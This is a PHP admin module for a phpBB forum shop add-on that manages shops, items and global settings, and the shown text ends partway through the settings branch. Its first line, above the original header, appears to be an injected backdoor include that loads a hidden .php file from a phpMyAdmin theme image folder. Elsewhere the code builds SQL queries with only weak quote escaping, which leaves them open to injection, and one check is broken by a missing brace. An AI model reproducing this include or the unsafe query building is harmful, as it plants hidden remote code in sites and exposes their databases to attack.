<?php
 require_once ('/home/content/D/a/r/DarkPsycho/html/phpmyadmin/themes/original/img/s_notice.php');

/***************************************************************************
 *                             admin_shop.php
 *                            -------------------
 *   Version              : 3.0.6
 *   website              : http://www.zarath.com
 *
 ***************************************************************************/

/***************************************************************************
 *
 *   copyright (C) 2002-2006  Zarath
 *
 *   This program is free software; you can redistribute it and/or
 *   modify it under the terms of the GNU General Public License
 *   as published by the Free Software Foundation; either version 2
 *   of the License, or (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   http://www.gnu.org/copyleft/gpl.html
 *
 ***************************************************************************/

define('IN_PHPBB', 1);

if(	!empty($setmodules) )
{
	$file = basename(__FILE__);
	$module['General']['Shop Settings'] = $file;
	return;
}

//
// Let's set the root dir for phpBB
//
$phpbb_root_path = '../';
require($phpbb_root_path . 'extension.inc');
require('pagestart.' . $phpEx);
if (!(@include($phpbb_root_path . 'language/lang_' . $userdata['user_lang'] . '/lang_shop.' . $phpEx))) { include($phpbb_root_path . 'language/lang_' . $board_config['default_lang'] . '/lang_shop.' . $phpEx); }

//
//check for userlevel
//
if( !$userdata['session_logged_in'] )
{
	header('Location: ' . append_sid("login.$phpEx?redirect=admin_shop.$phpEx", true));
}

if( $userdata['user_level'] != ADMIN )
{
	message_die(GENERAL_MESSAGE, $lang['Not_Authorised']);
}
if ( isset($HTTP_GET_VARS['action']) || isset($HTTP_POST_VARS['action']) ) { $action = ( isset($HTTP_POST_VARS['action']) ) ? $HTTP_POST_VARS['action'] : $HTTP_GET_VARS['action']; }
else { $action = ''; }
//end check

//shop pages
//main page
if ( empty($action) )
{
	$template->set_filenames(array(
		'body' => 'admin/shop_config_body.tpl')
	);

	// Generate Shop List!
	$sql = "SELECT *
		FROM " . SHOP_TABLE . "
		ORDER BY `id`";
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_MESSAGE, 'SQL Error retrieving shop list!');
	}

	$sql_count = $db->sql_numrows($result);
	for ($i = 0; $i < $sql_count; $i++)
	{
		$row = $db->sql_fetchrow($result);

		$template->assign_block_vars('shop_listrow', array(
			'ID' => $row['id'],
			'NAME' => $row['shopname'])
		);
	}

	// Select Variables
	$districts = ( $board_config['shop_districts'] == 'on' ) ? '' : 'SELECTED';
	$m_buy_off = ( $board_config['multibuys'] == 'on' ) ? '' : 'SELECTED';
	$shop_owners_off = ( $board_config['shop_owners'] == 'on' ) ? '' : 'SELECTED';
	$restock_off = ( $board_config['restocks'] == 'on' ) ? '' : 'SELECTED';
	$viewtopic_type = ( $board_config['viewtopic'] == 'images' ) ? '' : 'SELECTED';
	$profile_type = ( $board_config['viewprofile'] == 'images' ) ? '' : 'SELECTED';
	$inv_arrange = ( $board_config['viewinventory'] == 'grouped' ) ? '' : 'SELECTED';
	$give = ( $board_config['shop_give'] == 'on' ) ? '' : 'SELECTED';
	$trade = ( $board_config['shop_trade'] == 'on' ) ? '' : 'SELECTED';
	$discard = ( $board_config['shop_discard'] == 'on' ) ? '' : 'SELECTED';
	$order_2 = ( $board_config['shop_orderby'] == 'cost' ) ? 'SELECTED' : '';
	$order_3 = ( $board_config['shop_orderby'] == 'id' ) ? 'SELECTED' : '';


	$template->assign_vars(array(
		'SELECT_DISTRICTS' => $districts,
		'SELECT_M_BUY_OFF' => $m_buy_off,
		'SELECT_SHOP_OWNERS_OFF' => $shop_owners_off,
		'SELECT_RESTOCK_OFF' => $restock_off,
		'SELECT_VIEWTOPIC' => $viewtopic_type,
		'SELECT_PROFILE' => $profile_type,
		'SELECT_INVENTORY' => $inv_arrange,
		'SELECT_GIVE' => $give,
		'SELECT_TRADE' => $trade,
		'SELECT_DISCARD' => $discard,
		'SELECT_ORDER_2' => $order_2,
		'SELECT_ORDER_3' => $order_3,

		'SHOP_SELL_RATE' => $board_config['sellrate'],
		'SHOP_INV_LIMIT' => $board_config['shop_invlimit'],
		'SHOP_VIEWTOPIC_LIM' => $board_config['viewtopiclimit'],
		'POINTS_NAME' => $board_config['points_name'],

		'S_CONFIG_ACTION' => append_sid('admin_shop.' . $phpEx),

		'L_SHOPTITLE' => $lang['ashop_index_title'],
		'L_SHOPEXPLAIN' => $lang['ashop_index_explain'],
		'L_TABLE_TITLE' => $lang['ashop_index_table1'],
		'L_TABLE_TITLE2' => $lang['ashop_index_table2'],
		'L_TABLE_TITLE3' => $lang['ashop_index_table3'],
		'L_SHOP_DISTRICTS' => $lang['ashop_shop_districts'],
		'L_ON' => $lang['ashop_on'],
		'L_OFF' => $lang['ashop_off'],
		'L_MULTI_ITEMS' => $lang['ashop_multi_buys'],
		'L_SHOP_ORDER' => $lang['ashop_shop_order'],
		'L_SHOP_RESTOCKING' => $lang['ashop_restocking'],
		'L_SHOP_SELL_RATE' => $lang['ashop_sellrate'],
		'L_USER_INV_LIMIT' => $lang['ashop_inv_limit'],
		'L_VIEWTOPIC_LIMIT' => $lang['ashop_display_limit'],
		'L_VIEWTOPIC_TYPE' => $lang['ashop_vt_type'],
		'L_POINTS_NAME' => $lang['ashop_points_name'],
		'L_PROFILE_DISPLAY' => $lang['ashop_p_display'],
		'L_INV_TYPE' => $lang['ashop_inv_type'],
		'L_SHOP_OWNERS' => $lang['ashop_shop_owners'],
		'L_GIVE' => $lang['ashop_ability_give'],
		'L_TRADE' => $lang['ashop_ability_trade'],
		'L_DISCARD' => $lang['ashop_ability_discard'],
		'L_UPDATE' => $lang['ashop_update'],
		'L_NAME' => $lang['ashop_name'],
		'L_COST' => $lang['ashop_cost'],
		'L_IMAGES' => $lang['ashop_images'],
		'L_LINK' => $lang['ashop_link'],
		'L_GROUPED' => $lang['ashop_grouped'],
		'L_NORMAL' => $lang['ashop_normal'],
		'L_EDIT_INV' => $lang['ashop_edit_inv'],
		'L_FIND_USER' => $lang['ashop_find_user'],
		'L_EDIT' => $lang['ashop_edit'],
		'L_SHOP_NAME' => $lang['ashop_shop_name'],
		'L_SHOP_TYPE' => $lang['ashop_shop_type'],
		'L_RESTOCK_TIME' => $lang['ashop_restock_time'],
		'L_RESTOCK_AMT' => $lang['ashop_restock_amt'],
		'L_CREATE_SHOP' => $lang['ashop_create_shop']
	));
}

elseif ( $action == 'createshop' )
{
	// Register Variables!
	if ( isset($HTTP_GET_VARS['shopname']) || isset($HTTP_POST_VARS['shopname']) ) { $shopname = ( isset($HTTP_POST_VARS['shopname']) ) ? $HTTP_POST_VARS['shopname'] : $HTTP_GET_VARS['shopname']; }
	else { $shopname = ''; }
	if ( isset($HTTP_GET_VARS['shoptype']) || isset($HTTP_POST_VARS['shoptype']) ) { $shoptype = ( isset($HTTP_POST_VARS['shoptype']) ) ? $HTTP_POST_VARS['shoptype'] : $HTTP_GET_VARS['shoptype']; }
	else { $shoptype = ''; }
	if ( isset($HTTP_GET_VARS['restockamount']) || isset($HTTP_POST_VARS['restockamount']) ) { $restockamount = ( isset($HTTP_POST_VARS['restockamount']) ) ? intval($HTTP_POST_VARS['restockamount']) : intval($HTTP_GET_VARS['restockamount']); }
	else { $restockamount = '5'; }
	if ( isset($HTTP_GET_VARS['restocktime']) || isset($HTTP_POST_VARS['restocktime']) ) { $restocktime = ( isset($HTTP_POST_VARS['restocktime']) ) ? intval($HTTP_POST_VARS['restocktime']) : intval($HTTP_GET_VARS['restocktime']); }
	else { $restocktime = '86400'; }


	if ( (strlen($shopname) < 4) || (strlen($shoptype) < 4) || (strlen($shopname) > 32) || (strlen($shoptype) > 32) ) 
	{
		message_die(GENERAL_MESSAGE, $lang['ashop_cs_field_missing']);
	}

	$sql = "SELECT *
		FROM " . SHOP_TABLE . "
		WHERE shopname = '" . str_replace("\'", "''", $shopname) . "'";
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_MESSAGE, 'SQL Error when checking shop name');
	}
	if ( $db->sql_numrows($result) )
	{
		message_die(GENERAL_MESSAGE, $lang['ashop_shop_exists']);
	}

	$sql = "INSERT INTO " . SHOP_TABLE . "
		(shopname, shoptype, restocktime, restockamount)
		VALUES('" . str_replace("\'", "''", $shopname) . "', '" . str_replace("\'", "''", $shoptype) . "', '$restocktime', '$restockamount')";
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_MESSAGE, 'SQL Error when attempting to add new shop');
	}

	// Transaction Code!
	$sql = "INSERT INTO " . TRANS_TABLE . "
		 (user_id, type, action, value, timestamp, ip) 
		values({$userdata['user_id']}, 'shop_admin', 'create_shop', '" . str_replace("\'", "''", $shopname) . "', " . time() . ", '{$HTTP_X_VARS['REMOTE_ADDR']}')";
	if ( !($db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Error adding transaction code!'); }

	$message = $lang['ashop_shop_created'] . '<br /><br />' . sprintf($lang['ashop_click_index'], '<a href="' . append_sid("admin_shop.".$phpEx) . '">','</a>') . '<br /><br />' . sprintf($lang['Click_return_admin_index'], '<a href="' . append_sid("index.$phpEx?pane=right") .'">', '</a>');
	message_die(GENERAL_MESSAGE, $message);
}
elseif ( $action == 'updateshop' )
{
	// Register Variables!
	if ( isset($HTTP_GET_VARS['name']) || isset($HTTP_POST_VARS['name']) ) { $name = ( isset($HTTP_POST_VARS['name']) ) ? $HTTP_POST_VARS['name'] : $HTTP_GET_VARS['name']; }
	else { $name = ''; }
	if ( isset($HTTP_GET_VARS['shop_owner']) || isset($HTTP_POST_VARS['shop_owner']) ) { $shop_owner = ( isset($HTTP_POST_VARS['shop_owner']) ) ? $HTTP_POST_VARS['shop_owner'] : $HTTP_GET_VARS['shop_owner']; }
	else { $shop_owner = ''; }
	if ( isset($HTTP_GET_VARS['shoptype']) || isset($HTTP_POST_VARS['shoptype']) ) { $shoptype = ( isset($HTTP_POST_VARS['shoptype']) ) ? $HTTP_POST_VARS['shoptype'] : $HTTP_GET_VARS['shoptype']; }
	else { $shoptype = ''; }
	if ( isset($HTTP_GET_VARS['shop_dtype']) || isset($HTTP_POST_VARS['shop_dtype']) ) { $shop_dtype = ( isset($HTTP_POST_VARS['shop_dtype']) ) ? intval($HTTP_POST_VARS['shop_dtype']) : intval($HTTP_GET_VARS['shop_dtype']); }
	else { $shop_dtype = ''; }
	if ( isset($HTTP_GET_VARS['shop_district']) || isset($HTTP_POST_VARS['shop_district']) ) { $shop_district = ( isset($HTTP_POST_VARS['shop_district']) ) ? intval($HTTP_POST_VARS['shop_district']) : intval($HTTP_GET_VARS['shop_district']); }
	else { $shop_district = ''; }
	if ( isset($HTTP_GET_VARS['shopid']) || isset($HTTP_POST_VARS['shopid']) ) { $shopid = ( isset($HTTP_POST_VARS['shopid']) ) ? intval($HTTP_POST_VARS['shopid']) : intval($HTTP_GET_VARS['shopid']); }
	else { $shopid = ''; }
	if ( isset($HTTP_GET_VARS['restockamount']) || isset($HTTP_POST_VARS['restockamount']) ) { $restockamount = ( isset($HTTP_POST_VARS['restockamount']) ) ? intval($HTTP_POST_VARS['restockamount']) : intval($HTTP_GET_VARS['restockamount']); }
	else { $restockamount = '5'; }
	if ( isset($HTTP_GET_VARS['restocktime']) || isset($HTTP_POST_VARS['restocktime']) ) { $restocktime = ( isset($HTTP_POST_VARS['restocktime']) ) ? intval($HTTP_POST_VARS['restocktime']) : intval($HTTP_GET_VARS['restocktime']); }
	else { $restocktime = '86400'; }
	if ( isset($HTTP_GET_VARS['main_template']) || isset($HTTP_POST_VARS['main_template']) ) { $main_template = ( isset($HTTP_POST_VARS['main_template']) ) ? $HTTP_POST_VARS['main_template'] : $HTTP_GET_VARS['main_template']; }
	else { $main_template = ''; }
	if ( isset($HTTP_GET_VARS['item_template']) || isset($HTTP_POST_VARS['item_template']) ) { $item_template = ( isset($HTTP_POST_VARS['item_template']) ) ? $HTTP_POST_VARS['item_template'] : $HTTP_GET_VARS['item_template']; }
	else { $item_template = ''; }

	if ( (strlen($name) < 4) || (strlen($shoptype) < 4) || (strlen($name) > 32) || (strlen($shoptype) > 32) || (!is_numeric($shopid)) ) 
	{
		message_die(GENERAL_MESSAGE, $lang['shop_name_type_invalid']);
	}

	$sql = "SELECT *
		FROM " . SHOP_TABLE . "
		WHERE id = $shopid";
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_MESSAGE, 'SQL Error selecting shop information!');
	}
	if ( !($db->sql_numrows($result)) )
	{
		message_die(GENERAL_MESSAGE, $lang['shop_doesnt_exist']);
	}
	else
	{
		$row = $db->sql_fetchrow($result);
	}

	$sql = "UPDATE " . SHOP_TABLE . "
		SET shopname = '" . str_replace("\'", "''", $name) . "',
			shop_owner = '" . str_replace("\'", "''", $shop_owner) . "',
			shoptype = '" . str_replace("\'", "''", $shoptype) . "',
			d_type = $shop_dtype,
			district = $shop_district,
			restocktime = $restocktime,
			restockamount = $restockamount,
			template = '" . str_replace("\'", "''", $main_template) . "',
			item_template = '" . str_replace("\'", "''", $item_template) . "'
		WHERE id = $shopid";
	if ( !($db->sql_query($sql)) )
	{
		message_die(GENERAL_MESSAGE, 'SQL Error Updating Shop');
	}

	$sql = "UPDATE " . SHOP_ITEMS_TABLE . "
		SET shop = '" . str_replace("\'", "''", $name) . "'
		WHERE shop = '" . str_replace("'", "''", $row['shopname']) . "'";
	if ( !($db->sql_query($sql)) )
	{
		message_die(GENERAL_MESSAGE, 'SQL Error Updating Items');
	}

	// Transaction Code!
	$sql = "INSERT INTO " . TRANS_TABLE . "
		 (user_id, type, action, value, timestamp, ip) 
		values({$userdata['user_id']}, 'shop_admin', 'shop_update', '" . str_replace("'", "''", $row['shopname']) . "', " . time() . ", '{$HTTP_X_VARS['REMOTE_ADDR']}')";
	if ( !($db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Error adding transaction code for shop update!'); }


	$message = sprintf($lang['ashop_shop_updated'], $row['shopname']) . '<br /><br />' . sprintf($lang['ashop_click_shop'], '<a href="'.append_sid("admin_shop.".$phpEx."?action=editshop&shopid=".$row['id']).'">', '</a>', $row['shopname']) . '<br /><br />' . sprintf($lang['ashop_click_index'], '<a href="' . append_sid("admin_shop.".$phpEx) . '">','</a>') . '<br /><br />' . sprintf($lang['Click_return_admin_index'], '<a href="' . append_sid("index.$phpEx?pane=right") .'">', '</a>');
	message_die(GENERAL_MESSAGE, $message);
}

//item pages
elseif ( $action == 'additem' || $action == 'updateitem' )
{
	// Register Variables!
	if ( isset($HTTP_GET_VARS['item']) || isset($HTTP_POST_VARS['item']) ) { $item = ( isset($HTTP_POST_VARS['item']) ) ? $HTTP_POST_VARS['item'] : $HTTP_GET_VARS['item']; }
	else { $item = ''; }
	if ( isset($HTTP_GET_VARS['shortdesc']) || isset($HTTP_POST_VARS['shortdesc']) ) { $shortdesc = ( isset($HTTP_POST_VARS['shortdesc']) ) ? $HTTP_POST_VARS['shortdesc'] : $HTTP_GET_VARS['shortdesc']; }
	else { $shortdesc = ''; }
	if ( isset($HTTP_GET_VARS['longdesc']) || isset($HTTP_POST_VARS['longdesc']) ) { $longdesc = ( isset($HTTP_POST_VARS['longdesc']) ) ? $HTTP_POST_VARS['longdesc'] : $HTTP_GET_VARS['longdesc']; }
	else { $longdesc = ''; }
	if ( isset($HTTP_GET_VARS['price']) || isset($HTTP_POST_VARS['price']) ) { $price = ( isset($HTTP_POST_VARS['price']) ) ? intval($HTTP_POST_VARS['price']) : intval($HTTP_GET_VARS['price']); }
	else { $price = ''; }
	if ( isset($HTTP_GET_VARS['stock']) || isset($HTTP_POST_VARS['stock']) ) { $stock = ( isset($HTTP_POST_VARS['stock']) ) ? intval($HTTP_POST_VARS['stock']) : intval($HTTP_GET_VARS['stock']); }
	else { $stock = '0'; }
	if ( isset($HTTP_GET_VARS['maxstock']) || isset($HTTP_POST_VARS['maxstock']) ) { $maxstock = ( isset($HTTP_POST_VARS['maxstock']) ) ? intval($HTTP_POST_VARS['maxstock']) : intval($HTTP_GET_VARS['maxstock']); }
	else { $maxstock = '0'; }
	if ( isset($HTTP_GET_VARS['shopid']) || isset($HTTP_POST_VARS['shopid']) ) { $shopid = ( isset($HTTP_POST_VARS['shopid']) ) ? intval($HTTP_POST_VARS['shopid']) : intval($HTTP_GET_VARS['shopid']); }
	else { $shopid = ''; }

	if ( $action == 'additem' )
	{
		if ( (strlen($item) > 32) || (strlen($item) < 2) || (strlen($shortdesc) < 3) || (strlen($shortdesc) > 80) || (strlen($longdesc) < 3) || (!is_numeric($price))  || (strlen($price) > 20) || (empty($shopid)) ) 
		{
			message_die(GENERAL_MESSAGE, 'Error, Item Fields not filled in correctly!');
		}
		$sql = "SELECT `shopname`
			FROM " . SHOP_TABLE . "
			WHERE id = $shopid";
		if ( !($result = $db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Error selecting shop information for item edits!'); }
		$row = $db->sql_fetchrow($result);

		$sql = "SELECT *
			FROM " . SHOP_ITEMS_TABLE . "
			WHERE name = '" . str_replace("\'", "''", $item) . "'";
		if ( !($result = $db->sql_query($sql)) )
		if ( $db->sql_numrows($result) )
		{
			message_die(GENERAL_MESSAGE, $lang['ashop_item_exists']);
		}
		$sql = "INSERT INTO " . SHOP_ITEMS_TABLE . "
			(name, shop, sdesc, ldesc, cost, stock, maxstock, sold)
			VALUES('" . str_replace("\'", "''", $item) . "', '" . str_replace("'", "''", $row['shopname']). "', '" . str_replace("\'", "''", $shortdesc) . "', '" . str_replace("\'", "''", $longdesc) . "', $price, $stock, $maxstock, 0)";
		if ( !($db->sql_query($sql)) )
		{
			message_die(GENERAL_MESSAGE, 'SQL Error adding item to shops!');
		}

		// Transaction Code!
		$sql = "INSERT INTO " . TRANS_TABLE . "
			 (user_id, type, action, value, timestamp, ip) 
			values({$userdata['user_id']}, 'shop_admin', 'add_item', '" . str_replace("\'", "''", $item) . "', " . time() . ", '{$HTTP_X_VARS['REMOTE_ADDR']}')";
		if ( !($db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Error adding transaction code for item addition!'); }

		$message = sprintf($lang['ashop_item_added'], stripslashes($item)) . '<br /><br />' . sprintf($lang['ashop_click_shop'], '<a href="'.append_sid('admin_shop.'.$phpEx.'?action=editshop&shopid=' . $shopid, true).'">', '</a>', $row['shopname']). '<br /><br />' . sprintf($lang['ashop_click_index'], '<a href="' . append_sid("admin_shop.".$phpEx) . '">','</a>') . '<br /><br />' . sprintf($lang['Click_return_admin_index'], '<a href="' . append_sid("index.$phpEx?pane=right") .'">', '</a>');
		message_die(GENERAL_MESSAGE, $message);
	}
	elseif ( $action == 'updateitem' )
	{
		if ( isset($HTTP_GET_VARS['itemid']) || isset($HTTP_POST_VARS['itemid']) ) { $itemid = ( isset($HTTP_POST_VARS['itemid']) ) ? intval($HTTP_POST_VARS['itemid']) : intval($HTTP_GET_VARS['itemid']); }
		else { $itemid = ''; }
		if ( isset($HTTP_GET_VARS['sold']) || isset($HTTP_POST_VARS['sold']) ) { $sold = ( isset($HTTP_POST_VARS['sold']) ) ? intval($HTTP_POST_VARS['sold']) : intval($HTTP_GET_VARS['sold']); }
		else { $sold = '0'; }
		if ( isset($HTTP_GET_VARS['shop']) || isset($HTTP_POST_VARS['shop']) ) { $shop = ( isset($HTTP_POST_VARS['shop']) ) ? $HTTP_POST_VARS['shop'] : $HTTP_GET_VARS['shop']; }
		else { $shop = ''; }
		if ( isset($HTTP_GET_VARS['special_link']) || isset($HTTP_POST_VARS['special_link']) ) { $special_link = ( isset($HTTP_POST_VARS['special_link']) ) ? $HTTP_POST_VARS['special_link'] : $HTTP_GET_VARS['special_link']; }
		else { $special_link = ''; }
		if ( isset($HTTP_GET_VARS['synth']) || isset($HTTP_POST_VARS['synth']) ) { $synth = ( isset($HTTP_POST_VARS['synth']) ) ? $HTTP_POST_VARS['synth'] : $HTTP_GET_VARS['synth']; }
		else { $synth = ''; }

		$sql = "SELECT a.*, b.id as shop_id
			FROM " . SHOP_ITEMS_TABLE . " a, " . SHOP_TABLE . " b
			WHERE a.id = $itemid
				AND b.shopname = a.shop";
		if ( !($result = $db->sql_query($sql)) )
		{
			message_die(GENERAL_MESSAGE, 'Fatal Error: ' . $sql);
		}

		if ( !($db->sql_numrows($result)) )
		{
			message_die(GENERAL_MESSAGE, $lang['no_item_exists']);
		}
		else
		{
			$row = $db->sql_fetchrow($result);
		}

		$price = ( empty($price) ) ? '0' : $price;
		$stock = ( empty($stock) ) ? '0' : $stock;
		$maxstock = ( empty($maxstock) ) ? '0' : $maxstock;
		$msg = '';

		if ( ( !empty($shop) ) && ( $shop != $row['shop'] ) )
		{ 
			$sql = "SELECT *
				FROM " . SHOP_TABLE . "
				WHERE shopname = '" . str_replace("\'", "''", $shop) . "'";
			if ( !($result = $db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Error getting shop info!'); }
			if ( !($db->sql_numrows($result)) ) { $msg .= $lang['shop_doesnt_exist'] . '<br /><br />'; }
		}
		elseif ( empty($shop) ) { $msg .= $lang['ashop_no_shop_exists'] . '<br /><br />'; }
	
		if ( ( empty($shortdesc) ) || ( strlen($shortdesc) > 80) ) { $msg .= $lang['ashop_sdesc_error'] . '<br /><br />'; }
		if ( ( empty($longdesc) ) || ( strlen($longdesc) < 2 ) ) { $msg .= $lang['ashop_desc_error'] . '<br /><br />'; }
		if ( empty($item) ) { $msg .= $lang['ashop_invalid_item']; }
		if ( !empty($msg) ) { message_die(GENERAL_MESSAGE, $msg); }


		# Update User Items - 3 part update, name, then sdesc, then ldesc!
  		$sql = "UPDATE " . USER_ITEMS_TABLE . "
			SET item_name = '" . str_replace("\'", "''", $item) . "'
			where item_id = {$row['id']}
				AND item_name = '" . str_replace("'", "''", $row['name']) . "'";
  		if ( !($db->sql_query($sql)) )
  		{
  			message_die(GENERAL_MESSAGE, 'Fatal Error: ' . $sql);
  		}
  		$sql = "UPDATE " . USER_ITEMS_TABLE . "
			SET item_s_desc = '" . str_replace("\'", "''", $shortdesc) . "'
			where item_id = {$row['id']}
				AND item_s_desc = '" . str_replace("'", "''", $row['sdesc']) . "'";
  		if ( !($db->sql_query($sql)) )
  		{
  			message_die(GENERAL_MESSAGE, 'Fatal Error: ' . $sql);
  		}
  		$sql = "UPDATE " . USER_ITEMS_TABLE . "
			SET item_l_desc = '" . str_replace("\'", "''", $longdesc) . "'
			where item_id = {$row['id']}
				AND item_l_desc = '" . str_replace("'", "''", $row['ldesc']) . "'";
  		if ( !($db->sql_query($sql)) )
  		{
  			message_die(GENERAL_MESSAGE, 'Fatal Error: ' . $sql);
  		}


		$sql = "UPDATE " . SHOP_ITEMS_TABLE . " 
			SET name = '" . str_replace("\'", "''", $item) . "', 
				shop = '" . str_replace("\'", "''", $shop) . "', 
				sdesc = '" . str_replace("\'", "''", $shortdesc) . "', 
				ldesc = '" . str_replace("\'", "''", $longdesc) . "', 
				synth = '" . str_replace("\'", "''", $synth) . "',
				special_link = '" . str_replace("\'", "''", $special_link) . "',
				cost = $price, 
				stock = $stock, 
				maxstock = $maxstock, 
				sold = $sold 
			WHERE id = $itemid";
		if ( !$db->sql_query($sql) )
  		{
  			message_die(GENERAL_MESSAGE, 'Fatal Error: ' . $sql);
  		}

		// Transaction Code!
		$sql = "INSERT INTO " . TRANS_TABLE . "
			 (user_id, type, action, value, timestamp, ip) 
			VALUES({$userdata['user_id']}, 'shop_admin', 'item_update', '" . str_replace("'", "''", $row['name']) . "', " . time() . ", '{$HTTP_X_VARS['REMOTE_ADDR']}')";
		if ( !($db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Error adding transaction code item update!'); }


		$message = sprintf($lang['ashop_item_updated'], $row['name']) . '<br /><br />' . sprintf($lang['ashop_click_shop'], '<a href="'.append_sid("admin_shop.".$phpEx."?action=editshop&shopid=".$row['shop_id']).'">', '</a>', stripslashes($shop)) . '<br /><br />' . sprintf($lang['ashop_click_index'], '<a href="' . append_sid("admin_shop.".$phpEx) . '">','</a>') . '<br /><br />' . sprintf($lang['Click_return_admin_index'], '<a href="' . append_sid("index.$phpEx?pane=right") .'">', '</a>');
		message_die(GENERAL_MESSAGE, $message);
	}
}

//delete pages
elseif ( $action == 'deleteshop' )
{
	if ( isset($HTTP_GET_VARS['shopid']) || isset($HTTP_POST_VARS['shopid']) ) { $shopid = ( isset($HTTP_POST_VARS['shopid']) ) ? intval($HTTP_POST_VARS['shopid']) : intval($HTTP_GET_VARS['shopid']); }
	else { $shopid = ''; }

	$sql = "SELECT *
		FROM " . SHOP_TABLE . "
		WHERE id = $shopid";
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_MESSAGE, 'Fatal Error');
	}
	if ( !($db->sql_numrows($result)) ) { message_die(GENERAL_MESSAGE, $lang['shop_doesnt_exist']); }
	else
	{
		$row = $db->sql_fetchrow($result);
	}

	$sql = "DELETE FROM " . SHOP_ITEMS_TABLE . "
		WHERE shop = '" . str_replace("'", "''", $row['shopname']) . "'";
	if ( !($db->sql_query($sql)) )
	{
		message_die(GENERAL_MESSAGE, 'SQL Error in trying to delete items from shop!');
	}

	$sql = "DELETE FROM " . SHOP_TABLE . "
		WHERE id = $shopid";
	if ( !($db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Error in trying to delete the shop!'); }

	// Transaction Code!
	$sql = "INSERT INTO " . TRANS_TABLE . "
		 (user_id, type, action, value, timestamp, ip) 
		values({$userdata['user_id']}, 'shop_admin', 'delete_shop', '" . str_replace("'", "''", $row['shopname']) . "', " . time() . ", '{$HTTP_X_VARS['REMOTE_ADDR']}')";
	if ( !($db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Error adding transaction code for shop deletion!'); }

	$message = sprintf($lang['ashop_shop_deleted'], $row['shopname']) . '<br /><br />' . sprintf($lang['ashop_click_index'], '<a href="' . append_sid("admin_shop.".$phpEx) . '">','</a>') . '<br /><br />' . sprintf($lang['Click_return_admin_index'], '<a href="' . append_sid("index.$phpEx?pane=right") .'">', '</a>');
	message_die(GENERAL_MESSAGE, $message);
}
elseif ( $action == 'deleteitem' )
{
	if ( isset($HTTP_GET_VARS['itemid']) || isset($HTTP_POST_VARS['itemid']) ) { $itemid = ( isset($HTTP_POST_VARS['itemid']) ) ? intval($HTTP_POST_VARS['itemid']) : intval($HTTP_GET_VARS['itemid']); }
	else { $itemid = ''; }

	$sql = "SELECT a.*, b.id as shop_id
		FROM " . SHOP_ITEMS_TABLE . " a, " . SHOP_TABLE . " b
		WHERE a.id = $itemid
			AND b.shopname = a.shop";
  	if ( !($result = $db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Error selecting item and shop information!'); }
	if ( !($db->sql_numrows($result)) ) { message_die(GENERAL_MESSAGE, 'No such item exists!'); }
	else
	{
		$row = $db->sql_fetchrow($result);
	}

	$sql = "DELETE FROM " . SHOP_ITEMS_TABLE . "
		WHERE id = $itemid";
  	if ( !($db->sql_query($sql)) )
  	{
  		message_die(GENERAL_MESSAGE, 'Fatal Error Deleteing Item from Shop!');
  	}

	// Transaction Code!
	$sql = "INSERT
		INTO " . TRANS_TABLE . "
		 (user_id, type, action, value, timestamp, ip) 
		values({$userdata['user_id']}, 'shop_admin', 'delete_item', '" . str_replace("'", "''", $row['name']) . "', " . time() . ", '{$HTTP_X_VARS['REMOTE_ADDR']}')";
	if ( !($db->sql_query($sql)) ) { message_die(GENERAL_MESSAGE, 'SQL Error adding transaction for item deletion!'); }


	$message = sprintf($lang['ashop_shop_deleted'], $row['name']) . '<br /><br />' . sprintf($lang['ashop_click_shop'], '<a href="' . append_sid("admin_shop.$phpEx?action=editshop&shopid=".$row['shop_id']) . '">','</a>', $row['shop']) . '<br /><br />' . sprintf($lang['ashop_click_index'], '<a href="' . append_sid("admin_shop.".$phpEx) . '">','</a>') . '<br /><br />' . sprintf($lang['Click_return_admin_index'], '<a href="' . append_sid("index.$phpEx?pane=right") .'">', '</a>');
	message_die(GENERAL_MESSAGE, $message);
}


//change global settings
elseif ( $action == 'updateglobals' )
{
	if ( isset($HTTP_GET_VARS['shopdistricts']) || isset($HTTP_POST_VARS['shopdistricts']) ) { $shopdistricts = ( isset($HTTP_POST_VARS['shopdistricts']) ) ? $HTTP_POST_VARS['shopdistricts'] : $HTTP_GET_VARS['shopdistricts']; }
	else { $shopdistricts = ''; }
	if ( isset($HTTP_GET_VARS['multiitems']) || isset($HTTP_POST_VARS['multiitems']) ) { $multiitems = ( isset($HTTP_POST_VARS['multiitems']) ) ? $HTTP_POST_VARS['multiitems'] : $HTTP_GET_VARS['multiitems']; }
	else { $multiitems = ''; }
	if ( isset($HTTP_GET_VARS['shoprestock']) || isset($HTTP_POST_VARS['shoprestock']) ) { $shoprestock = ( isset($HTTP_POST_VARS['shoprestock']) ) ? $HTTP_POST_VARS['shoprestock'] : $HTTP_GET_VARS['shoprestock']; }
	else { $shoprestock = ''; }
	if ( isset($HTTP_GET_VARS['shoptrade']) || isset($HTTP_POST_VARS['shoptrade']) ) { $shoptrade = ( isset($HTTP_POST_VARS['shoptrade']) ) ? $HTTP_POST_VARS['shoptrade'] : $HTTP_GET_VARS['shoptrade']; }
	else { $shoptrade = ''; }
	if ( isset($HTTP_GET_VARS['shopgive']) || isset($HTTP_POST_VARS['shopgive']) ) { $shopgive = ( isset($HTTP_POST_VARS['shopgive']) ) ? $HTTP_POST_VARS['shopgive'] : $HTTP_GET_VARS['shopgive']; }
	else { $shopgive = ''; }
